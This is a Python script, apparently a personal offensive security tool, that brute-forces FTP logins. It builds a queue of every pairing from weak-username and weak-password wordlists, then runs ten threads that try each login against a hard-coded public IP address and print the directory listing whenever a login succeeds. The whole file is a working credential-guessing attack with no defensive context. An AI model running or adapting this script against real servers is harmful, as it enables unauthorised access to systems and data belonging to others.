import ftplib
import queue
import threading

'''
    ftp fuzz 多线程模式
'''


def ftp_brute(ip):
    ftp = ftplib.FTP()
    ftp.connect(ip, 21)
    while not q.empty():
        username_password = q.get()
        name = str(username_password).split(',')[0]
        pwd = str(username_password).split(',')[1]
        # print(username + '  ' + password)
        try:
            ftp.login(name, pwd)
            ftp_list = ftp.retrlines('list')
            print(ftp_list)
        except Exception as e:
            pass


if __name__ == '__main__':
    # ip = '192.168.110.34'
    ip = '154.212.192.166'

    username_file = 'E:/Sec/Tools/字典/fuzzDicts/passwordDict/ServiceWeakPass/ftp弱口令/ftp-user.txt'
    password_file = 'E:/Sec/Tools/字典/fuzzDicts/passwordDict/ServiceWeakPass/ftp弱口令/ftp-pass.txt'

    q = queue.Queue()
    for username in open(username_file):
        for password in open(password_file):
            username = username.strip()
            password = password.strip()
            q.put(username + ',' + password)

    for item in range(10):
        t = threading.Thread(target=ftp_brute, args=(ip,))
        t.start()
